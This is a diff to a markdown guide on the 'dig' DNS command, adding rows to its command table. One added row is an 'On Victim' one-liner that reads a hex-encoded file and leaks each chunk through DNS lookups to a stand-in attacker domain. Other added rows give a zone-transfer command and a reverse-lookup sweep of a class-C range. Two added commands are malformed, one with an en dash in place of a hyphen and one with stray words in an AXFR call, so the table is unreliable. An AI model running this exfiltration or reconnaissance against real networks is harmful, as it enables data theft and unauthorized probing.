@@ -41,6 +41,12 @@ The `dig` command (Domain Information Groper) is a versatile and powerful utilit
 | Provides a short, concise answer to the query. | `dig +short domain.com` |
 | Displays only the answer section of the query output. | `dig +noall +answer domain.com` |
 | Retrieves all available DNS records for the domain (Note: Many DNS servers ignore ANY queries to reduce load and prevent abuse, as per RFC 8482). | `dig domain.com ANY` |
+| Reverse domain lookup | `dig -x <IP_ADDRESS>` |
+| DNS zone transfer | `dig axfr <DOMAIN_NAME_TO_TRANSFER> @<DNS_IP>` |
+| DNS reverse lookup (Replace first three octets of IP to set class C address to scan) |`for ip in {1..254..1}; do dig –x 1.1.1.$ip \| grep $ip >> dns.txt; done;`|
+| On Victim: Read in each line and do a DNS lookup: |`for b in `cat file.hex `; do dig $b.shell.evilexample.com; done`|
+| Lookup domain by IP |`dig -x <ip>`|
+| Host transfer |`dig @ <ip> <domain> it AXFR`|
 
 **Caution**: Some servers can detect and block excessive DNS queries. Use caution and respect rate limits. Always obtain permission before performing extensive DNS reconnaissance on a target.
 
